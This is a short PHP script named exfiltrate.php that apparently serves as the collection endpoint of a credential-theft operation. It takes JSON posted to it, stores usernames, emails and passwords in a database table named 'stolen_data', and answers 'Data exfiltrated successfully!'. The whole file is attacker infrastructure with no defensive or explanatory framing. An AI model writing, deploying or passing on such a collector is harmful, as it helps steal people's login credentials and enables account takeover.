php
<?php
// exfiltrate.php
$servername = "localhost";
$username = "your_db_username";
$password = "your_db_password";
$dbname = "your_db_name";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$data = json_decode(file_get_contents('php://input'), true);

$stmt = $conn->prepare("INSERT INTO stolen_data (username, email, password) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $data['username'], $data['email'], $data['password']);

if ($stmt->execute()) {
    echo "Data exfiltrated successfully!";
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>
